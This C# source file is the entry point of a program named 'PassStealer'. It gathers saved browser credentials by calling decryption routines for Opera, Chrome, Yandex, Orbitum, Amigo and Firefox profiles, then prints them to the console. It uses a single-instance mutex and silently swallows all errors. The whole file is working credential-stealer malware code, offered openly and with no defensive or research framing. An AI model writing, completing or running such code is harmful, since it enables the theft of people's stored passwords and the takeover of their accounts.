using System;
using System.Collections.Generic;
using System.Threading;
namespace PassStealer
{
    internal class Program
    {
        private static Mutex m_instance;
        private const string m_appName = "esc";
        private static void Main(string[] args)
        {
            var general = new List<string[]>();
            bool flag;
            Program.m_instance = new Mutex(true, "esc", out flag);
            if (flag)
            {
               
                try
                {
                    ChromeBasedBrowsers.decrypt(Path.GetOperaPath(), general);
                    ChromeBasedBrowsers.decrypt(Path.GetChromePath("Chrome"), general);
                    ChromeBasedBrowsers.decrypt(Path.GetChromePath("Yandex"), general);
                    ChromeBasedBrowsers.decrypt(Path.GetChromePath("Orbitum"), general);
                    ChromeBasedBrowsers.decrypt(Path.GetChromePath("Amigo"), general);
                    FireFox.DecryptFirefox(general);
                    general.ForEach(x => Console.WriteLine(x[0]+ x[1]+ x[2]+ x[3]));
                    Console.ReadKey();
                }
                catch (Exception ex)
                {
              
                }
            }
        }
    }
}
